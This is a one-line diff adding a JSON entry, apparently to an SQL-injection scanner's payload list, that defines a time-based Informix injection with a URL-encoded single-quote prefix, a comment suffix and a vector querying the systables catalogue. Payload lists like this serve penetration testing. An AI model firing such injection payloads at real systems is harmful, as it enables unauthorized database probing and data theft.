@@ -1,0 +1,1 @@
+{"dbms": "informix", "technique": "time", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND (SELECT COUNT(*) FROM systables)", "comment": "informix time: url-enc single"}
